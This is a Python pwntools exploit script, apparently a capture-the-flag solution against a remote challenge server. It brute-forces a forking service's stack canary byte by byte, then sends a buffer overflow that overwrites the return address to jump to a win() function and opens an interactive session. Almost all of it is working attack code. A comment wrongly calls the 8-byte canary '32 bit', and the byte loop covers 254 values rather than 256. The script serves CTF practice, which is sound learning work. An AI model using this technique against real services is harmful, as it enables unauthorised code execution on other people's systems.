#!/usr/bin/python3
from pwn import *
import time
import struct


"""
canary1: 0x9cd250ee5e6ef900
canary2: 0x77466ec1cf7cfd00

canary changes every time we start the program. But we can brute force it since it is only 32 bit and the last byte is always 0x00.

Also, they are using fork to spawn a new process every time. Using fork creates a copy of the parent process. 
This means that the canary will be the same every fork() as long as the parent process is kept alive.

If we send some of the canary right and use 'send()' without the newline we can brute force one byte at a time.

Offset to canary is: 72
"""

offset = 72
canary = [0x00]
# Open only one connection and use it again and again

io = remote("0.cloud.chals.io", 10677)
#elf = ELF("reader")
#io = process(elf.path)
for cb in range(7): # 0 -> 6 which is 7 values. We have 8 bytes canary - the one we know 0x00.

    currentByte = 0
    for i in range (254): # All hex numbers with one byte 0 : 0x00 -> 255: 0xff
        log.info("currentByte: %s", hex(currentByte))

        payload = b"A" * offset
        payload += bytes(canary) + bytes([currentByte])
        log.info("payload: %s", payload)

        io.recv()
        io.send(payload)
        recv = io.recvline()
        print("recv:", recv)
        recv1 = io.recvline(timeout=0.1)
        print("recv1:", recv1)

        if b"stack" not in recv1:
            canary.append(currentByte)
            log.info("Canary so far: %s", bytes(canary))
            break

        else:
            currentByte += 1

print("Found canary:")
print("%s", bytes(canary))

# win() addrress: 0x00401276
padding = b"A"*8 # 8 bytes padding from canary to ret
payload = b"A"*offset + bytes(canary) + padding + p64(0x00401276)

io.send(payload)
io.interactive()
